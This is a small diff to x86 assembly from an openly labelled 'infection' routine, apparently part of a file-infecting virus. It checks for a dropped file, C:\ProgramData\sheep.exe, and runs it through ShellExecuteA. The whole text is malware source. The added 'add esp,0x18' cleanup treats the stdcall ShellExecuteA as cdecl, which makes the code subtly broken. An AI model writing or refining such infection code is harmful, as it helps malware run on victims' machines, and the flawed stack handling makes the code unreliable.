@@ -67,7 +67,7 @@ infection__data:
    lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
    push eax
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
-   cmp eax, 0xFFFFFFFF          ; eax == INVALID_FILE_ATTRIBUTES
+   cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
 
    push 0
@@ -90,6 +90,7 @@ infection__payload_exists:
    push 0
    push 0
    call edi                     ; ShellExecuteA(nullptr, nullptr, "C:\\ProgramData\\sheep.exe", nullptr, nullptr, 1)
+   add esp,0x18                 ; it's apparently cdecl
    
 infection__end:
    pop ebx
